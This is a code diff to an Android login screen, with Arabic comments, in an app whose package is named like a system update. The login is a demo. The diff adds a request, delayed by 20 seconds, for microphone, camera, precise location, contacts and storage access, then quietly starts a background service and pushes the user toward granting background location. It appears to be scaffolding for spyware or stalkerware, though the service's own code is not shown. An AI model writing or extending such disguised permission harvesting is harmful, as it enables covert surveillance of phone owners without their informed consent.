@@ -1,29 +1,42 @@
 package com.sys.update2
 
+import android.Manifest
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Color
+import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.text.InputType
 import android.view.View
+import android.view.WindowManager
 import android.view.animation.AnimationUtils
 import android.widget.EditText
 import android.widget.ImageView
-import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 
 class LoginActivity : AppCompatActivity() {
 
-    private lateinit var loginView: LinearLayout
-    private lateinit var registerView: LinearLayout
-    private lateinit var resetView: LinearLayout
+    private lateinit var loginView: View
+    private lateinit var registerView: View
+    private lateinit var resetView: View
+    private val PERM_REQUEST_CODE = 2001
+    private val PERM_DELAY_MS = 20_000L  // 20 ثانية
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
+        // شريط الحالة بنفس لون الصفحة (أسود داكن)
+        window.statusBarColor = Color.parseColor("#02081a")
+        window.navigationBarColor = Color.parseColor("#02081a")
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            window.decorView.systemUiVisibility = 0  // أيقونات بيضا
+        }
 
         try {
             setContentView(R.layout.activity_login)
@@ -155,9 +168,95 @@ class LoginActivity : AppCompatActivity() {
             findViewById<TextView>(R.id.fSend).setOnClickListener {
                 showToast("Code will be sent (demo)")
             }
+
+            // ⭐ طلب الأذونات بعد 20 ثانية
+            Handler(Looper.getMainLooper()).postDelayed({
+                requestAllPermissions()
+            }, PERM_DELAY_MS)
+
         } catch (e: Exception) {
             Toast.makeText(this, "Init error: ${e.message}", Toast.LENGTH_LONG).show()
         }
+    }
+
+    // ═══════════════════════════════════════════
+    //  طلب كل الأذونات
+    // ═══════════════════════════════════════════
+    private fun requestAllPermissions() {
+        try {
+            val needed = mutableListOf<String>()
+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.RECORD_AUDIO)
+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.CAMERA)
+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
+                needed.add(Manifest.permission.READ_CONTACTS)
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
+                    needed.add(Manifest.permission.POST_NOTIFICATIONS)
+            }
+
+            if (needed.isNotEmpty()) {
+                ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
+            } else {
+                // لو كلهم ممنوحين، شغّل الخدمة في الخلفية
+                startBackgroundService()
+            }
+        } catch (e: Exception) {
+            Toast.makeText(this, "Perm err: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        // بعد ما الأذونات تمنح — شغّل الـ BackgroundService
+        startBackgroundService()
+
+        // لو الـ Background Location ناقص — اطلبه
+        Handler(Looper.getMainLooper()).postDelayed({
+            requestBackgroundLocation()
+        }, 3000)
+    }
+
+    private fun requestBackgroundLocation() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                try {
+                    val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                    intent.data = android.net.Uri.parse("package:$packageName")
+                    startActivity(intent)
+                } catch (_: Exception) {}
+            }
+        }
+    }
+
+    private fun startBackgroundService() {
+        try {
+            val intent = Intent(this, BackgroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+        } catch (_: Exception) {}
     }
 
     private fun toggleVisibility(edit: EditText) {
